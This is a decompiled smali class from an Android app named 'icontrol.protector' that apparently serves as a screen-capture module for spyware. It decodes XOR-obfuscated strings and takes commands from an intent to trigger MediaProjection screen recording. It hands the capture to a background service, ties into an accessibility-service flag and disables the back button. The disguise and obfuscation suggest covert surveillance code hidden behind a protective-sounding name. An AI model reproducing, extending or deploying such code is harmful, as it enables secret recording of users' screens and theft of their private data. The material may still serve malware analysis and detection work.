.class public Lcom/icontrol/protector/ActivityCaptureScreen;
.super Landroid/app/Activity;
.source "SourceFile"


# static fields
.field private static b:I = 0x46

.field private static c:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v0, 0x4

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ActivityCaptureScreen;->c:Ljava/lang/String;

    return-void

    :array_0
    .array-data 1
        -0x7bt
        0x1at
        -0x70t
        -0x24t
    .end array-data

    :array_1
    .array-data 1
        -0x15t
        0x6ft
        -0x4t
        -0x50t
        -0x1et
        -0x6et
        -0x1bt
        -0x6ft
    .end array-data
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private a()V
    .locals 1

    .line 1
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/icontrol/protector/ScreenCaps;->w(Landroid/content/Context;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method

.method private b()V
    .locals 4

    .line 1
    const/16 v0, 0x10

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x22

    const/16 v3, 0x64

    if-lt v1, v2, :cond_0

    invoke-static {}, Lntidisestablish/neumonoul/floccinaucinih/t1;->a()Landroid/media/projection/MediaProjectionConfig;

    move-result-object v1

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/u1;->a(Landroid/media/projection/MediaProjectionManager;Landroid/media/projection/MediaProjectionConfig;)Landroid/content/Intent;

    move-result-object v0

    :goto_0
    invoke-virtual {p0, v0, v3}, Landroid/app/Activity;->startActivityForResult(Landroid/content/Intent;I)V

    goto :goto_1

    :cond_0
    invoke-virtual {v0}, Landroid/media/projection/MediaProjectionManager;->createScreenCaptureIntent()Landroid/content/Intent;

    move-result-object v0

    goto :goto_0

    :goto_1
    return-void

    :array_0
    .array-data 1
        0x6bt
        0x1at
        -0x45t
        0x2ft
        -0x37t
        -0x7at
        0x78t
        0x45t
        0x69t
        0x15t
        -0x46t
        0x25t
        -0x24t
        -0x50t
        0x67t
        0x59t
    .end array-data

    :array_1
    .array-data 1
        0x6t
        0x7ft
        -0x21t
        0x46t
        -0x58t
        -0x27t
        0x8t
        0x37t
    .end array-data
.end method


# virtual methods
.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 2

    const/16 v0, 0x64

    if-ne p1, v0, :cond_0

    const/4 p1, -0x1

    if-ne p2, p1, :cond_0

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->G:Ljava/lang/String;

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    const/4 p1, 0x0

    sput-boolean p1, Lcom/icontrol/protector/AccessServices;->y:Z

    sput-object p3, Lntidisestablish/neumonoul/floccinaucinih/ab;->B:Landroid/content/Intent;

    sput p2, Lntidisestablish/neumonoul/floccinaucinih/ab;->C:I

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    sget v0, Lcom/icontrol/protector/ActivityCaptureScreen;->b:I

    sget-object v1, Lcom/icontrol/protector/ActivityCaptureScreen;->c:Ljava/lang/String;

    invoke-static {p1, p2, p3, v0, v1}, Lcom/icontrol/protector/ScreenCaps;->v(Landroid/content/Context;ILandroid/content/Intent;ILjava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p0, p1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_0
    return-void
.end method

.method public onBackPressed()V
    .locals 0

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 8

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object p1

    const/4 v0, 0x3

    const/16 v1, 0x8

    :try_start_0
    new-array v2, v0, [B

    fill-array-data v2, :array_0

    new-array v3, v1, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    sget-object v2, Lntidisestablish/neumonoul/floccinaucinih/ab;->g:Ljava/lang/String;

    invoke-static {v2}, Ljava/util/regex/Pattern;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    const/4 p1, 0x0

    :goto_0
    if-nez p1, :cond_0

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void

    :cond_0
    const/4 v2, 0x0

    aget-object v3, p1, v2

    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v4

    const/16 v5, 0x9df

    const/4 v6, 0x2

    const/4 v7, 0x1

    if-eq v4, v5, :cond_2

    const v2, 0x1314f

    if-eq v4, v2, :cond_1

    goto :goto_1

    :cond_1
    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v2, v1, [B

    fill-array-data v2, :array_3

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    move v2, v7

    goto :goto_2

    :cond_2
    new-array v0, v6, [B

    fill-array-data v0, :array_4

    new-array v4, v1, [B

    fill-array-data v4, :array_5

    invoke-static {v0, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    goto :goto_2

    :cond_3
    :goto_1
    const/4 v2, -0x1

    :goto_2
    if-eqz v2, :cond_5

    if-eq v2, v7, :cond_4

    goto/16 :goto_3

    :cond_4
    invoke-direct {p0}, Lcom/icontrol/protector/ActivityCaptureScreen;->a()V

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    goto :goto_3

    :cond_5
    aget-object v0, p1, v7

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    sput v0, Lcom/icontrol/protector/ActivityCaptureScreen;->b:I

    aget-object p1, p1, v6

    sput-object p1, Lcom/icontrol/protector/ActivityCaptureScreen;->c:Ljava/lang/String;

    const/16 p1, 0x12

    new-array v0, p1, [B

    fill-array-data v0, :array_6

    new-array v2, v1, [B

    fill-array-data v2, :array_7

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    sget v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->C:I

    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    new-array p1, p1, [B

    fill-array-data p1, :array_8

    new-array v0, v1, [B

    fill-array-data v0, :array_9

    invoke-static {p1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    sget-object p1, Lntidisestablish/neumonoul/floccinaucinih/ab;->B:Landroid/content/Intent;

    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    sget-object p1, Lntidisestablish/neumonoul/floccinaucinih/ab;->B:Landroid/content/Intent;

    const/16 v0, 0x22

    if-eqz p1, :cond_6

    sget p1, Lntidisestablish/neumonoul/floccinaucinih/ab;->C:I

    const/16 v1, -0x3e7

    if-eq p1, v1, :cond_6

    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    if-ge p1, v0, :cond_6

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    sget v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->C:I

    sget-object v1, Lntidisestablish/neumonoul/floccinaucinih/ab;->B:Landroid/content/Intent;

    sget v2, Lcom/icontrol/protector/ActivityCaptureScreen;->b:I

    sget-object v3, Lcom/icontrol/protector/ActivityCaptureScreen;->c:Ljava/lang/String;

    invoke-static {p1, v0, v1, v2, v3}, Lcom/icontrol/protector/ScreenCaps;->v(Landroid/content/Context;ILandroid/content/Intent;ILjava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p0, p1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void

    :cond_6
    invoke-direct {p0}, Lcom/icontrol/protector/ActivityCaptureScreen;->b()V

    sput-boolean v7, Lcom/icontrol/protector/AccessServices;->y:Z

    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt p1, v0, :cond_7

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->G:Ljava/lang/String;

    sget-object v1, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p1, v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :cond_7
    :goto_3
    return-void

    :array_0
    .array-data 1
        0x22t
        -0x5at
        -0x59t
    .end array-data

    :array_1
    .array-data 1
        0x61t
        -0x17t
        -0x16t
        -0x4ft
        0x3t
        -0x8t
        -0x7ft
        0x5at
    .end array-data

    :array_2
    .array-data 1
        -0xbt
        -0x4ft
        0x73t
    .end array-data

    :array_3
    .array-data 1
        -0x46t
        -0x9t
        0x35t
        -0x66t
        -0x2t
        -0x62t
        0x17t
        0x32t
    .end array-data

    :array_4
    .array-data 1
        0x79t
        -0x3bt
    .end array-data

    nop

    :array_5
    .array-data 1
        0x36t
        -0x75t
        -0x6bt
        0x68t
        -0x7et
        0x2ft
        -0xft
        0x3bt
    .end array-data

    :array_6
    .array-data 1
        -0x3ct
        0x22t
        0x16t
        -0x70t
        0x27t
        -0x76t
        0x33t
        0x18t
        -0xet
        0x25t
        0xct
        -0x72t
        0x36t
        -0x53t
        0x3t
        0xet
        -0xet
        0x6ct
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x69t
        0x56t
        0x79t
        -0x1et
        0x42t
        -0x12t
        0x6ct
        0x6at
    .end array-data

    :array_8
    .array-data 1
        0x66t
        -0x52t
        -0x4et
        0x71t
        -0x46t
        -0x2et
        0x57t
        -0x1et
        0x5bt
        -0x52t
        -0x48t
        0x6dt
        -0x55t
        -0x2et
        0x69t
        -0x1t
        0x54t
        -0x20t
    .end array-data

    nop

    :array_9
    .array-data 1
        0x35t
        -0x26t
        -0x23t
        0x3t
        -0x21t
        -0x4at
        0x8t
        -0x75t
    .end array-data
.end method
